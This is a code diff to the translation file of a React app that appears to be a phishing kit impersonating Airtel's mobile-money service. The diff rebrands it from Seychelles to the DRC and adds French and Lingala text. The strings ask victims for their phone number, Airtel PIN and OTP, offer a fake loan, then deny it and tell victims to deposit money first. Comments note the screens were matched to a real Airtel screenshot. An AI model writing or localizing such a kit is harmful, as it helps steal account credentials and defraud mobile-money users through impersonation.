@@ -1,7 +1,7 @@
 // src/LanguageContext.tsx
 import React, { createContext, useContext, useState, useEffect, ReactNode } from 'react';
 
-type Language = 'cr' | 'en' | 'fr';
+type Language = 'fr' | 'ln' | 'en'; // Set French as the primary type
 
 interface LanguageContextType {
   language: Language;
@@ -12,99 +12,8 @@ interface LanguageContextType {
 const LanguageContext = createContext<LanguageContextType | undefined>(undefined);
 
 const translations: Record<Language, Record<string, string>> = {
-  cr: {
-    // Global
-    brandTitle: 'Airtel Sesel',
-    brandSubtitle: 'Pre rapid. Nenport ler. Nenport kote.',
-    secureText: 'Ou bann informasyon i an sekirite.',
-    approvalSpinner: 'Aprobasyon an kour...',
-    invalidCredentials: 'Kredans pa valid',
-    networkError: 'Errer rezo. Tanpri esey ankor.',
-    
-    // Login
-    welcomeBack: 'Byenveni',
-    loginSubtitle: 'Konekte ar ou kont Airtel Sesel',
-    phoneNumber: 'Nimero telefon',
-    enterPin: 'Antre ou koud PIN Airtel',
-    loginBtn: 'Konekte',
-    
-    // OTP Page
-    otpTitle: 'Verifikasyon OTP',
-    otpSubtitle: 'Antre OTP ki finn ganny voye kot ou nimero telefon',
-    otpWaitingSub: 'Nou finn voye ou demann. Tanpri atann pandan nou pe verifie ou bann detay...',
-    enterOtp: 'Antre OTP 4 sif',
-    otpExpires: 'Koud i ekspire dan',
-    submitBtn: 'SOUMET',
-    seconds: 'segonn',
-    
-    // Loan Limit
-    loanLimit: 'Ou Limit Pre',
-    dragSlider: 'Gliise pou swazir ou montan',
-    availableAmount: 'Montan Pre Disponib',
-    loanTerm: 'Dire Pre',
-    interestRate: 'To Entere',
-    processingFee: 'Fre Dossier',
-    monthlyPayment: 'Peman sak Mwa',
-    continueLoan: 'Kontinie pou Ganny Pre',
-    months: 'mwa',
-
-    // Denied Page
-    loanDenied: 'Pre Refize!',
-    deniedSubtitle: 'Ou demann pou en pre de',
-    deniedReason: 'finn ganny refize akoz ou kont pa annan ase aktivite.',
-    inactiveMoney: 'Airtel Money Inaktif',
-    depositAmount: 'Tanpri depoze omwen',
-    depositSub: 'dan ou kont Airtel Money pou aktive li e pou ou kapab demann enn nouvo pre.',
-    noFundsDeducted: 'Pa annan okenn larzan ki finn retire dan ou kont.',
-    applyAgain: 'Ou kapab aplik pou pre ankour touswit apre ou finn depoze',
-    returnDashboard: 'Retounen kot Tablo de Bord',
-    backToLogin: 'Retounen pou Konekte'
-  },
-  en: {
-    brandTitle: 'Airtel Seychelles',
-    brandSubtitle: 'Fast loans. Anytime. Anywhere.',
-    secureText: 'Your information is secure.',
-    approvalSpinner: 'Approval in progress...',
-    invalidCredentials: 'Invalid credentials',
-    networkError: 'Network error. Please try again.',
-
-    welcomeBack: 'Welcome back',
-    loginSubtitle: 'Log in to your Airtel Seychelles account',
-    phoneNumber: 'Phone number',
-    enterPin: 'Enter your Airtel PIN code',
-    loginBtn: 'Login',
-    
-    otpTitle: 'OTP Verification',
-    otpSubtitle: 'Enter the OTP sent to your phone number',
-    otpWaitingSub: 'Your request has been sent. Please wait while we verify your details...',
-    enterOtp: 'Enter 4-digit OTP',
-    otpExpires: 'Code expires in',
-    submitBtn: 'SUBMIT',
-    seconds: 'seconds',
-
-    loanLimit: 'Your Loan Limit',
-    dragSlider: 'Drag the slider to choose your amount',
-    availableAmount: 'Available Loan Amount',
-    loanTerm: 'Loan Term',
-    interestRate: 'Interest Rate',
-    processingFee: 'Processing Fee',
-    monthlyPayment: 'Monthly Repayment',
-    continueLoan: 'Continue to Get Loan',
-    months: 'months',
-
-    loanDenied: 'Loan Denied!',
-    deniedSubtitle: 'Your application for a loan of',
-    deniedReason: 'has been denied due to insufficient account activity.',
-    inactiveMoney: 'Inactive Airtel Money',
-    depositAmount: 'Please deposit at least',
-    depositSub: 'to your Airtel Money account to activate it and qualify for a new loan.',
-    noFundsDeducted: 'No funds have been deducted from your account.',
-    applyAgain: 'You can apply for the loan again immediately after depositing',
-    returnDashboard: 'Return to Dashboard',
-    backToLogin: 'Back to Login'
-  },
   fr: {
-    brandTitle: 'Airtel Seychelles',
+    brandTitle: 'Airtel RDC',
     brandSubtitle: 'Prêts rapides. À tout moment. N\'importe où.',
     secureText: 'Vos informations sont sécurisées.',
     approvalSpinner: 'Approbation en cours...',
@@ -112,10 +21,10 @@ const translations: Record<Language, Record<string, string>> = {
     networkError: 'Erreur réseau. Veuillez réessayer.',
 
     welcomeBack: 'Bon retour',
-    loginSubtitle: 'Connectez-vous à votre compte Airtel Seychelles',
+    loginSubtitle: 'Connectez-vous à Airtel Lite pour finaliser le paiement.', // Matched Screenshot
     phoneNumber: 'Numéro de téléphone',
-    enterPin: 'Entrez votre code PIN Airtel',
-    loginBtn: 'Connexion',
+    enterPin: 'Entrez votre Code', // Matched Screenshot
+    loginBtn: 'CONNEXION', // Matched Screenshot
     
     otpTitle: 'Vérification OTP',
     otpSubtitle: 'Entrez l\'OTP envoyé à votre numéro',
@@ -145,15 +54,102 @@ const translations: Record<Language, Record<string, string>> = {
     applyAgain: 'Vous pouvez postuler à nouveau immédiatement après avoir déposé',
     returnDashboard: 'Retour au tableau de bord',
     backToLogin: 'Retour à la connexion'
+  },
+  ln: {
+    brandTitle: 'Airtel DRC',
+    brandSubtitle: 'Mbongo ya mbalasela. Ntango nyonso. Esika nyonso.',
+    secureText: 'Basi na yo ezali na libateli.',
+    approvalSpinner: 'Kondima ezali na bokambami...',
+    invalidCredentials: 'Nkombo to motindo ya nkoma ezali mabe.',
+    networkError: 'Likambo na nzela ya nzete. Svp meka lisusu.',
+    
+    welcomeBack: 'Boyei malamu',
+    loginSubtitle: 'Kokota na konte na yo ya Airtel DRC',
+    phoneNumber: 'Nimero ya telefone',
+    enterPin: 'Kotisa code PIN na yo ya Airtel',
+    loginBtn: 'Kokota',
+    
+    otpTitle: 'Bokengi ya OTP',
+    otpSubtitle: 'Kotisa OTP oyo etindami na nimero na yo ya telefone',
+    otpWaitingSub: 'Bosenga na yo etindami. Svp zela ntango tozali kotala makambo na yo...',
+    enterOtp: 'Kotisa OTP ya mikomisa 4',
+    otpExpires: 'Code ekosila na',
+    submitBtn: 'KOTINDA',
+    seconds: 'ba secondes',
+    
+    loanLimit: 'Ndelo ya mbongo ya nyongo na yo',
+    dragSlider: 'Kokasa slide mpo na kopona motuya',
+    availableAmount: 'Mbongo ya nyongo ezwami',
+    loanTerm: 'Eleko ya nyongo',
+    interestRate: 'Motuya ya intere',
+    processingFee: 'Mbongo ya bokambi',
+    monthlyPayment: 'Lifuti ya sanza',
+    continueLoan: 'Kokoba mpo na kozwa nyongo',
+    months: 'sanza',
+
+    loanDenied: 'Nyongo eboyami!',
+    deniedSubtitle: 'Bosenga na yo ya nyongo ya',
+    deniedReason: 'eboyami mpo na aktivite ya moke na konte na yo.',
+    inactiveMoney: 'Airtel Money ezali kosala te',
+    depositAmount: 'Svp tia ata',
+    depositSub: 'na konte na yo ya Airtel Money mpo na ko activer yango mpe kozwa nyongo ya sika.',
+    noFundsDeducted: 'Mbongo moko te ebimisami na konte na yo.',
+    applyAgain: 'Okoki kosenga nyongo lisusu mbala moko sima ya kotia',
+    returnDashboard: 'Kozonga na tableau de bord',
+    backToLogin: 'Kozonga na kokota'
+  },
+  en: {
+    brandTitle: 'Airtel DRC',
+    brandSubtitle: 'Fast loans. Anytime. Anywhere.',
+    secureText: 'Your information is secure.',
+    approvalSpinner: 'Approval in progress...',
+    invalidCredentials: 'Invalid credentials',
+    networkError: 'Network error. Please try again.',
+
+    welcomeBack: 'Welcome back',
+    loginSubtitle: 'Log in to your Airtel DRC account',
+    phoneNumber: 'Phone number',
+    enterPin: 'Enter your Airtel PIN code',
+    loginBtn: 'LOGIN',
+    
+    otpTitle: 'OTP Verification',
+    otpSubtitle: 'Enter the OTP sent to your phone number',
+    otpWaitingSub: 'Your request has been sent. Please wait while we verify your details...',
+    enterOtp: 'Enter 4-digit OTP',
+    otpExpires: 'Code expires in',
+    submitBtn: 'SUBMIT',
+    seconds: 'seconds',
+
+    loanLimit: 'Your Loan Limit',
+    dragSlider: 'Drag the slider to choose your amount',
+    availableAmount: 'Available Loan Amount',
+    loanTerm: 'Loan Term',
+    interestRate: 'Interest Rate',
+    processingFee: 'Processing Fee',
+    monthlyPayment: 'Monthly Repayment',
+    continueLoan: 'Continue to Get Loan',
+    months: 'months',
+
+    loanDenied: 'Loan Denied!',
+    deniedSubtitle: 'Your application for a loan of',
+    deniedReason: 'has been denied due to insufficient account activity.',
+    inactiveMoney: 'Inactive Airtel Money',
+    depositAmount: 'Please deposit at least',
+    depositSub: 'to your Airtel Money account to activate it and qualify for a new loan.',
+    noFundsDeducted: 'No funds have been deducted from your account.',
+    applyAgain: 'You can apply for the loan again immediately after depositing',
+    returnDashboard: 'Return to Dashboard',
+    backToLogin: 'Back to Login'
   }
 };
 
 export const LanguageProvider = ({ children }: { children: ReactNode }) => {
-  const [language, setLanguageState] = useState<Language>('cr'); 
+  // CHANGED: Default is now French ('fr') to match the screenshot
+  const [language, setLanguageState] = useState<Language>('fr'); 
 
   useEffect(() => {
     const savedLang = localStorage.getItem('appLanguage') as Language;
-    if (savedLang && ['cr', 'en', 'fr'].includes(savedLang)) {
+    if (savedLang && ['fr', 'ln', 'en'].includes(savedLang)) {
       setLanguageState(savedLang);
     }
   }, []);
